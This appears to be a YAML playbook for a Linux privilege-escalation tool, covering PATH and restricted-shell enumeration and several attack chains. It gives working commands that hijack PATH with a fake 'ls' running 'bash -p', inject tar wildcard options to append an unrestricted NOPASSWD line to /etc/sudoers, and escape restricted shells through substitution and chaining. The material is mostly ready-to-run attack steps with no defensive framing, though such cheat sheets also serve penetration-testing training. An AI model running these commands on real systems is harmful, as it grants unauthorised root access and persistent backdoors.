name: Linux PrivEsc Enviroment Abuse

steps:

# =========================================================
# [1] BASIC CONTEXT
# =========================================================
- title: PATH Enumeration
  mode: enum
  info: |
    Identify if PATH can be abused.
    Look for writable or dangerous entries.

  entries:

    - cmd: "echo $PATH"
      info: path
      look_for:
        - "'.' in path"
        - writable dirs
        - /tmp /dev/shm /home

      notes:
        - normal: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

    - cmd: "env | grep PATH"
      info: path (alt)

    - cmd: "pwd && conncheck"
      info: cwd + exec test
      notes:
        - shows if binaries run from PATH dirs
        
        
- title: PATH Abuse
  mode: chain
  info: |
    Exploit PATH by hijacking binary execution.
    Works when privileged process runs commands without full path.

  entries:

    - cmd: "PATH=.:${PATH}"
      info: add cwd

    - cmd: "export PATH"
      info: apply

    - cmd: "echo $PATH"
      info: verify
      look_for:
        - "'.' at start"

    - cmd: "echo 'bash -p' > ls"
      info: fake binary

    - cmd: "chmod +x ls"
      info: make executable

    - cmd: "ls"
      info: trigger

  notes:
    - requires privileged execution context
    - useful with sudo / cron / scripts
    
    
    
- title: Wildcard Abuse (tar)
  mode: chain
  info: |
    Exploit wildcard expansion in tar.
    Works when cron or script uses '*' without sanitization.

  entries:

    - cmd: "echo 'echo \"user ALL=(root) NOPASSWD: ALL\" >> /etc/sudoers' > root.sh"
      info: payload script

    - cmd: "echo \"\" > --checkpoint-action=exec=sh root.sh"
      info: inject exec

    - cmd: "echo \"\" > --checkpoint=1"
      info: trigger checkpoint

    - cmd: "ls -la"
      info: verify files

    - cmd: "sudo -l"
      info: check escalation

  notes:
    - requires writable directory used by cron
    - works with tar + wildcard (*)
    
    
- title: Restricted Shell Detection
  mode: enum
  info: |
    Identify restricted shell environment.

  entries:

    - cmd: "echo $0"
      info: shell
      look_for:
        - rbash
        - rksh
        - rzsh

    - cmd: "echo $SHELL"
      info: shell path

    - cmd: "env"
      info: env vars
      look_for:
        - restricted indicators
    
    - cmd: compgen -c
      info: allowed commands
      look_for:
        - python / perl / awk
        - vi / vim / less
        - anything interactive
      notes:
        - shows execution surface
        
        
        
- title: Restricted Shell Escape
  mode: chain
  info: |
    Attempt to bypass shell restrictions.
    Try different techniques depending on allowed syntax.

  entries:

    - cmd: "ls -l `pwd`"
      info: injection

    - cmd: "ls -l $(pwd)"
      info: substitution

    - cmd: "ls -l; pwd"
      info: chaining

    - cmd: "ls -l | pwd"
      info: pipe abuse

  notes:
    - depends on allowed characters
    - try variations if blocked 
